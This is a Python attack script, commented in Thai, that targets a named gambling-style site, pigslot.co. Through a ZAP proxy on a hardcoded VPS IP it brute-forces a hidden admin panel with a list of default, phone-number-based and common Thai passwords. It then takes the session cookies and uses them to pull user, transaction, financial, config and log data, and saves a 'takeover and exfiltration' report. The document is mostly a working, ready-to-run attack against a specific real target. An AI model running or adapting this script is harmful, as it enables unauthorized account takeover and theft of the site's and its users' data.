#!/usr/bin/env python3

import sys
import os
import requests
import time
import json
import re
import subprocess
from urllib.parse import urljoin
import shutil
from bs4 import BeautifulSoup

# --- Global Configuration ---
TARGET_URL = "https://pigslot.co/"
ADMIN_PANEL_PATH = "/admin-force"
ADMIN_LOGIN_URL = urljoin(TARGET_URL, ADMIN_PANEL_PATH)
OUTPUT_DIR = "admin_breach_results"

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'  # <<< ใส่ IP Address ของ VPS ที่รัน ZAP Daemon
ZAP_PROXY_PORT = 8080
ZAP_API_KEY = "YourSecureApiKey123"  # <<< *** ต้องเปลี่ยนเป็น API Key จริงที่คุณตั้งไว้ตอนรัน ZAP ***

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

# --- Helper Functions ---
def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def save_report(filename, content):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    filepath = os.path.join(OUTPUT_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)
    print_success(f"--- Final report saved to: {filepath} ---")

def install_required_libraries():
    """ตรวจสอบและติดตั้ง Libraries ที่จำเป็น: requests, beautifulsoup4"""
    libraries = {"requests": "requests", "bs4": "beautifulsoup4", "lxml": "lxml"}
    for import_name, package_name in libraries.items():
        try:
            __import__(import_name)
        except ImportError:
            print_warning(f"'{package_name}' not found. Attempting to install...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", package_name])
                print_success(f"'{package_name}' installed successfully.")
            except subprocess.CalledProcessError as e:
                print_error(f"Failed to install '{package_name}': {e}")
                return False
            except Exception as e:
                print_error(f"An unexpected error occurred during installation of '{package_name}': {e}")
                return False
    return True

def test_zap_connection():
    """ทดสอบการเชื่อมต่อกับ ZAP Proxy"""
    print_info("Testing ZAP Proxy connection...")
    try:
        test_session = requests.Session()
        test_session.proxies = PROXIES
        test_session.timeout = 10
        
        # ทดสอบด้วยการเข้า Google
        response = test_session.get("http://httpbin.org/ip", verify=False)
        if response.status_code == 200:
            print_success("ZAP Proxy connection successful!")
            print_info(f"Response from httpbin.org/ip: {response.text}")
            return True
        else:
            print_error(f"ZAP Proxy test failed with status: {response.status_code}")
            return False
    except Exception as e:
        print_error(f"ZAP Proxy connection failed: {e}")
        print_warning("Make sure ZAP Daemon is running on VPS and accessible")
        return False

# --- Core Functions ---
def perform_admin_login():
    """ทำการ Login และคืนค่า Credentials, Cookies, และ Response หากสำเร็จ"""
    print_info(f"--- Attempting to login to: {ADMIN_LOGIN_URL} ---")
    
    credentials_to_try = [
        ("admin", "admin"),
        ("administrator", "administrator"),
        ("admin", "password"),
        ("admin", "123456"),
        ("root", "root"),
        ("test", "test"),
        ("0960422161", "181242"),
        ("admin", "181242"),
        ("0960422161", "admin"),
        ("pigslot", "pigslot"),
        ("admin", "pigslot"),
        ("user", "user"),
        ("guest", "guest"),
        ("demo", "demo"),
        ("admin", "qwerty"),
        ("admin", "password123"),
        ("admin", "admin123"),
        ("superuser", "superuser"),
        ("moderator", "moderator"),
        ("operator", "operator"),
        ("manager", "manager"),
        ("webmaster", "webmaster"),
        ("admin", ""),
        ("", "admin"),
        ("admin", "12345"),
        ("admin", "abc123"),
        ("admin", "letmein"),
        ("admin", "welcome"),
        ("service", "service"),
        ("support", "support"),
        # เพิ่ม Phone number variations
        ("0960422161", "password"),
        ("0960422161", "123456"),
        ("0960422161", "0960422161"),
        # Thai common passwords
        ("admin", "รหัสผ่าน"),
        ("admin", "1234"),
        ("admin", "0000"),
        ("admin", "9999"),
    ]
    
    session = requests.Session()
    session.proxies = PROXIES # ใช้ ZAP Proxy
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    
    compromised_creds = None
    admin_cookies = None
    login_response = None
    
    try:
        print_info("Fetching login page to analyze form structure...")
        response = session.get(ADMIN_LOGIN_URL, timeout=15, verify=False)
        response.raise_for_status()
        
        print_info(f"Login page status: {response.status_code}")
        
        soup = BeautifulSoup(response.text, 'lxml')
        csrf_token = None
        
        # หา CSRF Token
        for name in ['csrf_token', 'authenticity_token', 'token', 'nonce', '_token']:
            token_input = soup.find('input', {'name': name})
            if token_input:
                csrf_token = token_input.get('value')
                print_info(f"Found CSRF token ({name}): {csrf_token}")
                break
        
        # หา form fields
        form = soup.find('form')
        if form:
            print_info("Login form found, analyzing fields...")
            inputs = form.find_all('input')
            for inp in inputs:
                field_name = inp.get('name', '')
                field_type = inp.get('type', '')
                print_info(f"  Form field: {field_name} (type: {field_type})")
        
        login_payload_base = {}
        if csrf_token:
            # หาชื่อ field ที่ถูกต้องสำหรับ CSRF token
            for name in ['csrf_token', 'authenticity_token', 'token', 'nonce', '_token']:
                if soup.find('input', {'name': name}):
                    login_payload_base[name] = csrf_token
                    break
            
    except requests.exceptions.Timeout:
        print_error(f"Timeout fetching login page {ADMIN_LOGIN_URL}.")
        return None, None, None
    except requests.exceptions.RequestException as e:
        print_error(f"Failed to fetch login page {ADMIN_LOGIN_URL}: {e}")
        return None, None, None
    except Exception as e:
        print_error(f"An unexpected error occurred during initial fetch: {e}")
        return None, None, None

    print_info("Starting credential testing...")
    for i, (user, pwd) in enumerate(credentials_to_try):
        print(f"Attempt {i+1}/{len(credentials_to_try)}: Trying {user}:{pwd}", end='\r')
        
        current_payload = login_payload_base.copy()
        current_payload['username'] = user
        current_payload['password'] = pwd
        
        # ลองชื่อ field อื่นๆ ด้วย
        current_payload['user'] = user
        current_payload['pass'] = pwd
        current_payload['email'] = user
        current_payload['login'] = user
        
        try:
            login_response = session.post(ADMIN_LOGIN_URL, data=current_payload, timeout=15, verify=False, allow_redirects=False)
            
            login_successful = False
            success_indicators = ["dashboard", "welcome", "admin panel", "logout", "administration", "control panel"]
            failure_indicators = ["invalid", "incorrect", "wrong", "failed", "error"]
            
            response_text_lower = login_response.text.lower()
            
            if login_response.status_code == 200:
                # ตรวจสอบว่ามี indicator ของการ login สำเร็จหรือไม่
                if any(indicator in response_text_lower for indicator in success_indicators):
                    if not any(indicator in response_text_lower for indicator in failure_indicators):
                        login_successful = True
                        
            elif login_response.status_code == 302: # Redirect
                redirect_location = login_response.headers.get('Location', '')
                if redirect_location:
                    # ถ้า redirect ไปที่อื่นที่ไม่ใช่หน้า login เดิม แสดงว่า login สำเร็จ
                    if ADMIN_PANEL_PATH not in redirect_location.lower() and "login" not in redirect_location.lower():
                        login_successful = True
                        print_info(f"Redirect detected to: {redirect_location}")
            
            if login_successful:
                print_success(f"\n!!! ADMIN ACCOUNT COMPROMISED !!!")
                print_success(f"  - Login Successful with: {user}:{pwd}")
                print_info(f"  - Response Status: {login_response.status_code}")
                print_info(f"  - Response Length: {len(login_response.text)}")
                
                compromised_creds = (user, pwd)
                admin_cookies = session.cookies.get_dict()
                
                if admin_cookies:
                    print_info("Session cookies obtained:")
                    for cookie_name, cookie_value in admin_cookies.items():
                        print_info(f"  - {cookie_name}: {cookie_value[:50]}...")
                
                return compromised_creds, admin_cookies, login_response
            
        except requests.exceptions.Timeout:
            print_warning(f"\n  - Timeout while trying {user}:{pwd}")
        except requests.exceptions.RequestException as e:
            print_error(f"\n  - Request error for {user}:{pwd}: {e}")
        except Exception as e:
            print_error(f"\n  - Unexpected error for {user}:{pwd}: {e}")

    print_error("\nLogin failed. Could not compromise admin credentials.")
    return None, None, None

def perform_post_exploitation(compromised_creds, admin_cookies):
    """ทำการ Post-Exploitation โดยใช้ Cookies ที่ได้จากการ Login"""
    if not compromised_creds or not admin_cookies:
        print_warning("Cannot perform post-exploitation without successful admin login and cookies.")
        return None

    print_info("\n--- Performing Post-Exploitation Actions to Confirm Damage ---")
    
    # *** IMPORTANT: Replace these with actual API paths identified by ZAP/Burp Suite ***
    # หลังจาก Login สำเร็จ ให้ใช้ ZAP ดักจับ Traffic และหา API Path ที่ถูกต้อง
    api_endpoints_to_test = {
        "admin_dashboard": "/admin/dashboard",                    # Dashboard หลัก
        "users_list": "/admin/users",                            # รายชื่อผู้ใช้
        "users_api": "/api/admin/users",                         # API ผู้ใช้
        "transactions_history": "/admin/transactions",           # ประวัติธุรกรรม
        "transactions_api": "/api/transactions",                 # API ธุรกรรม
        "dashboard_stats": "/admin/stats",                       # สถิติ
        "dashboard_api": "/api/admin/dashboard",                 # API Dashboard
        "user_details": "/admin/user/1",                         # รายละเอียดผู้ใช้
        "user_details_api": "/api/user/1",                       # API รายละเอียดผู้ใช้
        "site_config": "/admin/settings",                        # การตั้งค่า
        "config_api": "/api/admin/config",                       # API การตั้งค่า
        "financial_data": "/admin/financial",                    # ข้อมูลการเงิน
        "reports": "/admin/reports",                             # รายงาน
        "logs": "/admin/logs",                                   # Log
        "system_info": "/admin/system",                          # ข้อมูลระบบ
        # เพิ่ม API Path อื่นๆ ที่คุณหาเจอจาก ZAP
    }
    
    # Mapping เพื่อแสดง Path ที่ถูกต้องใน Report (ควรตรงกับ api_endpoints_to_test)
    api_paths_map = api_endpoints_to_test.copy()

    session = requests.Session()
    session.proxies = PROXIES # ใช้ Proxy ZAP
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/html, application/xhtml+xml, text/plain, */*', 
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'X-Requested-With': 'XMLHttpRequest', 
        'Referer': ADMIN_LOGIN_URL 
    })
    
    session.cookies.update(admin_cookies)
    
    post_exploitation_data = {}
    
    for endpoint_name, api_path in api_endpoints_to_test.items():
        full_api_url = urljoin(TARGET_URL, api_path)
        print(f"[+] Testing admin endpoint: {full_api_url}", end='\r')
        
        try:
            response = session.get(full_api_url, timeout=15, verify=False)
            
            if response.status_code == 200:
                content_type = response.headers.get('content-type', '').lower()
                
                if 'application/json' in content_type:
                    try:
                        data = response.json()
                        post_exploitation_data[endpoint_name] = {"status": "SUCCESS", "data": data, "type": "JSON"}
                        print(f"\n[+] Successfully retrieved JSON data from {endpoint_name}.")
                        if isinstance(data, list) and len(data) > 0:
                            print(f"    - Sample data: {str(data[0])[:200]}...")
                        elif isinstance(data, dict):
                            print(f"    - Sample data: {str(data)[:200]}...")
                        else:
                            print(f"    - Sample data: {str(data)[:200]}...")
                             
                    except json.JSONDecodeError:
                        post_exploitation_data[endpoint_name] = {"status": "SUCCESS_NON_JSON", "content": response.text[:500] + "...", "type": "HTML/TEXT"}
                        print(f"\n[+] Successfully accessed {endpoint_name} (HTML/Text response).")
                else:
                    # HTML หรือ text response
                    post_exploitation_data[endpoint_name] = {"status": "SUCCESS_NON_JSON", "content": response.text[:500] + "...", "type": "HTML/TEXT"}
                    print(f"\n[+] Successfully accessed {endpoint_name} (HTML/Text response).")
                    
            elif response.status_code == 404:
                post_exploitation_data[endpoint_name] = {"status": "FAILED", "message": "404 Not Found"}
                # ไม่ print error สำหรับ 404 เพราะเป็นเรื่องปกติ
            elif response.status_code == 403:
                post_exploitation_data[endpoint_name] = {"status": "FAILED", "message": "403 Forbidden"}
                print(f"\n[!] Access denied to {endpoint_name} (Status: 403).")
            elif response.status_code == 401:
                post_exploitation_data[endpoint_name] = {"status": "FAILED", "message": "401 Unauthorized"}
                print(f"\n[!] Unauthorized access to {endpoint_name} (Status: 401).")
            else:
                post_exploitation_data[endpoint_name] = {"status": "FAILED", "message": f"{response.status_code} {response.reason}"}

        except requests.exceptions.Timeout:
            post_exploitation_data[endpoint_name] = {"status": "ERROR", "message": "Connection timed out"}
        except requests.exceptions.RequestException as e:
            post_exploitation_data[endpoint_name] = {"status": "ERROR", "message": str(e)}
        except Exception as e:
            post_exploitation_data[endpoint_name] = {"status": "ERROR", "message": f"Unexpected error: {e}"}
            
    print(" " * 100) # Clear the line with progress message
    
    # Summary
    successful_endpoints = [name for name, result in post_exploitation_data.items() if result.get('status') in ['SUCCESS', 'SUCCESS_NON_JSON']]
    if successful_endpoints:
        print_success(f"\nSuccessfully accessed {len(successful_endpoints)} admin endpoints:")
        for endpoint in successful_endpoints:
            print_success(f"  - {endpoint}: {api_paths_map[endpoint]}")
    
    return post_exploitation_data

def generate_final_report(compromised_creds, post_exploitation_data, api_paths_map_arg):
    """สร้างรายงานสรุปผลการโจมตี"""
    
    report_content = "============================================================\n"
    report_content += "FINAL REPORT: ADMIN ACCOUNT TAKEOVER & DATA EXFILTRATION\n\n"
    report_content += f"Target: {TARGET_URL}\n"
    report_content += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    report_content += f"ZAP Proxy: {ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}\n\n"
    
    if compromised_creds:
        report_content += "🚨 SUCCESS: Administrator access was gained and sensitive data was potentially exfiltrated.\n\n"
        report_content += "VULNERABILITY & EXPLOITATION METHOD:\n\n"
        report_content += f"1. Hidden Admin Panel Discovery: Admin panel found at path: {ADMIN_PANEL_PATH}\n"
        report_content += f"2. Weak Credentials: Compromise achieved using credentials '{compromised_creds[0]}:{compromised_creds[1]}'\n"
        report_content += f"3. Session Management: Successfully obtained and used admin session cookies\n\n"
        report_content += "DAMAGE & PROOF OF COMPROMISE:\n\n"
        report_content += "ADMINISTRATOR CREDENTIALS COMPROMISED:\n"
        report_content += f"Username: {compromised_creds[0]}\n"
        report_content += f"Password: {compromised_creds[1]}\n\n"
        report_content += "POST-EXPLOITATION EVIDENCE:\n\n"
        
        if post_exploitation_data:
            successful_endpoints = []
            failed_endpoints = []
            
            for endpoint_name, result in post_exploitation_data.items():
                actual_path = api_paths_map_arg.get(endpoint_name, '/unknown')
                full_url = urljoin(TARGET_URL, actual_path)
                
                if result.get('status') in ['SUCCESS', 'SUCCESS_NON_JSON']:
                    successful_endpoints.append((endpoint_name, full_url, result))
                else:
                    failed_endpoints.append((endpoint_name, full_url, result))
            
            if successful_endpoints:
                report_content += f"✅ SUCCESSFULLY ACCESSED {len(successful_endpoints)} ADMIN ENDPOINTS:\n\n"
                
                for endpoint_name, full_url, result in successful_endpoints:
                    report_content += f"Endpoint: {full_url}\n"
                    report_content += f"Status: {result.get('status')}\n"
                    report_content += f"Type: {result.get('type', 'Unknown')}\n"
                    
                    if result.get('status') == "SUCCESS" and result.get('data'):
                        sample_data = result['data']
                        if isinstance(sample_data, list) and len(sample_data) > 0:
                            report_content += f"Sample data: {str(sample_data[0])[:300]}...\n"
                        elif isinstance(sample_data, dict):
                            report_content += f"Sample data: {str(sample_data)[:300]}...\n"
                        else:
                            report_content += f"Sample data: {str(sample_data)[:300]}...\n"
                    elif result.get('status') == "SUCCESS_NON_JSON":
                        report_content += f"Content sample: {result.get('content', '')[:300]}...\n"
                    
                    report_content += "\n"
            
            if failed_endpoints:
                report_content += f"❌ FAILED TO ACCESS {len(failed_endpoints)} ENDPOINTS:\n\n"
                for endpoint_name, full_url, result in failed_endpoints:
                    if result.get('status') != 'FAILED' or '404' not in result.get('message', ''):
                        report_content += f"Endpoint: {full_url}\n"
                        report_content += f"Status: {result.get('status')} - {result.get('message', '')}\n\n"
        else:
            report_content += "No post-exploitation data available.\n\n"
            
        report_content += "🔥 CONCLUSION: Administrative access confirmed with potential for sensitive data exfiltration. This vulnerability poses a CRITICAL SECURITY RISK.\n\n"
        report_content += "RECOMMENDATIONS:\n"
        report_content += "1. Change admin credentials immediately\n"
        report_content += "2. Implement strong password policies\n"
        report_content += "3. Add multi-factor authentication\n"
        report_content += "4. Review admin panel access controls\n"
        report_content += "5. Monitor admin access logs\n"

    else:
        report_content += "❌ FAILURE: Administrator login attempts were unsuccessful.\n\n"
        report_content += "VULNERABILITY & EXPLOITATION METHOD:\n\n"
        report_content += f"Admin panel discovered at: {ADMIN_PANEL_PATH}\n"
        report_content += "However, login attempts with common credentials failed.\n\n"
        report_content += "CONCLUSION: The admin panel could not be compromised with basic credential attacks. Further investigation with additional attack vectors may be required.\n"

    report_content += "============================================================\n"
    
    return report_content

# --- Main Execution ---
if __name__ == "__main__":
    print_info("Admin Breacher Script with ZAP Proxy Integration")
    print_info("=" * 60)
    
    if not install_required_libraries():
        sys.exit(1)
        
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Test ZAP connection first
    if not test_zap_connection():
        print_error("ZAP Proxy connection failed. Please check:")
        print_error("1. ZAP Daemon is running on VPS (46.202.177.106:8080)")
        print_error("2. VPS firewall allows connections on port 8080")
        print_error("3. ZAP is configured to accept external connections")
        sys.exit(1)

    # Mapping จากชื่อ endpoint ที่ใช้ในโค้ด ไปยัง Path จริงๆ 
    # *** คุณต้องแก้ไข Path เหล่านี้ตามจริงที่ได้จากการดักจับ Traffic ด้วย ZAP ***
    api_paths_map = {
        "admin_dashboard": "/admin/dashboard",
        "users_list": "/admin/users", 
        "users_api": "/api/admin/users",
        "transactions_history": "/admin/transactions",
        "transactions_api": "/api/transactions", 
        "dashboard_stats": "/admin/stats",
        "dashboard_api": "/api/admin/dashboard",
        "user_details": "/admin/user/1",
        "user_details_api": "/api/user/1",
        "site_config": "/admin/settings",
        "config_api": "/api/admin/config",
        "financial_data": "/admin/financial",
        "reports": "/admin/reports",
        "logs": "/admin/logs",
        "system_info": "/admin/system",
    }

    print_info("Starting Admin Attack with ZAP Traffic Analysis...")
    print_warning("Make sure to:")
    print_warning("1. ZAP GUI is connected to the Daemon on VPS")
    print_warning("2. Browser proxy is set to ZAP")
    print_warning("3. You will login manually first to capture traffic")

    # 1. ทำการ Login
    compromised_creds, admin_cookies, login_response = perform_admin_login()
    
    post_exploitation_data = None
    # 2. หาก Login สำเร็จ ให้ทำการ Post-Exploitation
    if compromised_creds:
        post_exploitation_data = perform_post_exploitation(compromised_creds, admin_cookies)
    
    # 3. สร้าง Report สุดท้าย
    final_report = generate_final_report(compromised_creds, post_exploitation_data, api_paths_map)
    
    # 4. แสดงผลและบันทึก Report
    print("\n\n" + final_report)
    save_report("FINAL_ADMIN_TAKEOVER_REPORT.txt", final_report)
    
    print_info("Script execution finished.")
    print_info("Check ZAP GUI for captured traffic and API endpoints!")